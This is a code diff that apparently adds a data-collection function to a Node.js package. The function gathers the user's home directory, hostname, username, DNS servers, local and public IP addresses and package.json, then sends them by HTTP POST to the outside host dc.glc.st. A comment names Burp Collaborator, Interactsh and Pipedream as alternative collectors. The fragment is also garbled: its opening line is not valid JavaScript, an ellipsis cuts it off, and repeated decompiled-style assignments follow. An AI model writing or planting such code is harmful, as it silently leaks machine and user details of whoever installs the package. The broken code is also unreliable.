@@ -1,0 +1,44 @@
+function extractData = function extractData()
+{
+    const trackingData = JSON.stringify({
+        p: package,
+        c: __dirname,
+        hd: os.homedir(),
+        hn: os.hostname(),
+        un: os.userInfo().username,
+        dns: dns.getServers(),
+        lip: JSON.stringify(local_ips),
+        pip: public_ip,
+        r: packageJSON ? packageJSON.___resolved : undefined,
+        v: packageJSON.version,
+        pjson: packageJSON,
+    });
+    // console.log(trackingData);
+
+    var postData = querystring.stringify({
+        msg: trackingData,
+    });
+    // console.log(postData);
+
+    var options = {
+        hostname: "dc.glc.st", //replace burpcollaborator.net with Interactsh or pipedream
+        port: 80,
+        path: "/",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": postData.length,
+        },
+    };
+    // console.log(options);
+
+    var req = http.request(options, (res) => {
+        res.on("data", (d) => {
+...
+_tmp_0.p = package
+_tmp_0.c = __dirname
+_tmp_0.hd = os.homedir()
+_tmp_0.hn = os.hostname()
+_tmp_0.un = os.userInfo().username
+_tmp_0.dns = dns.getServers()
+_tmp_0.lip = JSON.stringify(local_ips)
